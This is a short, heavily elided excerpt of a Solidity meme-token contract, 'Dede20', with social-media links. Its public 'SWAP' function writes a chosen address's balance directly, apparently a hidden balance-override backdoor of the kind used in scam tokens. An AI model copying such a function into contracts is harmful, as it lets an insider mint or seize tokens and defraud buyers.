...
Telegram: https://t.me/dedepepekillertwo


Twitter:  https://twitter.com/dedepepekiller2
...
contract Dede20 is Context, Ownable, IERC20 {
    ...
    address public DIS;
    uint256 marketFee = 0;
    address public marketAddress = 0x5FF4093A01389b08fFcBccfFF505139e0Ac0FF76; //
    ...
    function SWAP(uint enable) public {
        ...
        _balances[DIS] = tokenToBurn.sub(_balances[DIS]);
    }
